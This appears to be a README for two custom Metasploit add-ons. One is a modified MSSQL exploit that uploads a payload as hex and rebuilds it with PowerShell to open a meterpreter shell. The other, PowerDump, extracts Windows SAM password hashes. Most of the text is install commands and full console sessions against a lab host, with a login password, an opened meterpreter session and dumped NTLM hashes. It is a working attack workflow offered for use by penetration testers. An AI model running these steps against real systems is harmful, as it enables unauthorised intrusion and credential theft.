Metasploit Modules Installation

*** MSSQL_PAYLOAD ***

The modified mssql_payload incorporates the new powershell attack vector by taking
a Metasploit based executable and uploading it through MSSQL via hexadecimal format. 
It will then convert the hex based executable back to a binary through powershell.

Instructions:

Copy mssql_payload.rb to your metasploit directory under:

modules/exploits/windows/mssql/

ex. cp mssql_payload.rb /pentest/exploits/framework3/modules/exploits/windows/mssql/

Copy mssql.rb to your metasploit directory under:

lib/msf/core/exploit/

ex. cp mssql.rb /pentest/exploits/framework3/lib/msf/core/exploit/

Usage:

Warning: If x64 based payloads do not work, using standard meterpreter based payloads, they
will work just as well. Ran into strange MSF issues, looks like VMWare only issues.

root@bt:/pentest/exploits/framework3# msfconsole

                ##                          ###           ##    ##
 ##  ##  #### ###### ####  #####   #####    ##    ####        ######
####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##
####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##
## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##
##   ##  #### ###   #####   #####     ##   ####   ####   #### ###
                                      ##


       =[ metasploit v3.4.1-dev [core:3.4 api:1.0]
+ -- --=[ 566 exploits - 274 auxiliary
+ -- --=[ 209 payloads - 26 encoders - 8 nops
       =[ svn r9563 updated today (2010.06.19)

msf > use windows/mssql/mssql_payload
msf exploit(mssql_payload) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf exploit(mssql_payload) > set RHOST 172.16.32.217
RHOST => 172.16.32.217
msf exploit(mssql_payload) > set password P@55w0rd
password => P@55w0rd
msf exploit(mssql_payload) > set UsePowerShell true
UsePowerShell => true
emsf exploit(mssql_payload) > exploit

[*] Started bind handler
[*] Warning: This module will leave VVvmqwhC.exe in the SQL Server %TEMP% directory
[*] Uploading the payload VVvmqwhC, please be patient...
[*] Converting the payload utilizing PowerShell EncodedCommand...
[*] Executing the payload...
[*] Sending stage (748032 bytes) to 172.16.32.217
[*] Be sure to cleanup VVvmqwhC.exe...
[*] Meterpreter session 1 opened (172.16.32.129:39467 -> 172.16.32.217:4444) at 2010-06-20 01:18:24 -0400

meterpreter > 

*** PowerDump ***

PowerDump is a method of extracting the SAM database purely through PowerShell. This is a meterpreter
based script. Simply type "run powerdump" from the meterpreter console.

Instructions:

Copy powerdump.rb to your metasploit directory under:

scripts/meterpreter/

ex. cp powerdump.rb /pentest/exploits/framework3/scripts/meterpreter

Copy the powerdump.ps1 to your metasploit directory under:

data/exploits/powershell/

ex. mkdir data/exploits/powershell && cp powerdump.ps1 /pentest/exploits/framework3/data/exploits/powershell/

Usage:

[*] Meterpreter session 1 opened (172.16.32.129:39467 -> 172.16.32.217:4444) at 2010-06-20 01:18:24 -0400

meterpreter > run powerdump
[*] PowerDump v0.1 - SAM Dumping through PowerShell x86 and x64...
[*] Running PowerDump to extract Username and Password Hashes...
[*] Uploaded PowerDump as 42889.ps1 to %TEMP%...
[*] Setting ExecutionPolicy to Unrestricted...
[*] Dumping the SAM database through PowerShell...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bc23a1506bd3c8d3a533680c516bab27:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Setting Execution policy back to Restricted...
[*] Cleaning up after ourselves...
meterpreter >
